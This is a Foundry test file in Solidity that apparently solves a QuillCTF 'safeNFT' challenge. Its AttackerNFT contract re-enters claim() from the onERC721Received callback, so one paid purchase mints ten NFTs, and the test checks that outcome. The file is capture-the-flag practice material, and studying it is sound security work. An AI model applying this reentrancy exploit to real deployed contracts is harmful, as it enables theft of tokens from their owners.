// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "../src/4-NFT/safeNFT.sol";

contract AttackerNFT is IERC721Receiver, Test {
    safeNFT _nft;
    bool public complete;
    address internal _owner;
    uint256 z = 1;

    constructor(address _safenft) {
        _nft = safeNFT(_safenft);
        _owner = msg.sender;
    }

    function Attacker() public payable {
        _nft.buyNFT{value: msg.value}();
        _nft.claim();

        uint256 balance = _nft.balanceOf(address(this));
        for (uint256 i = 0; i < balance; i++) {
            _nft.transferFrom(address(this), _owner, i);
            //console.log("transfered一次");
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        if (z < 10) {
            z++;
            _nft.claim();
            // claiming the
        }
        return this.onERC721Received.selector;
    }
}

contract safeNftTest is Test {
    address public attacker;

    safeNFT public target;

    function setUp() public {
        attacker = makeAddr("attacker");

        vm.deal(attacker, 1 ether);

        target = new safeNFT("QuillCTF", "QNF", 0.01 ether);
    }

    function testAttackNFT() public {
        vm.startPrank(attacker);
        AttackerNFT attackNFT = new AttackerNFT(address(target));
        attackNFT.Attacker{value: 0.01 ether}();
        vm.stopPrank();
        uint256 attackerBalance;
        attackerBalance = target.balanceOf(attacker);
        assertEq(attackerBalance, 10);
        console.log("attackerBalance", attackerBalance);
    }
}
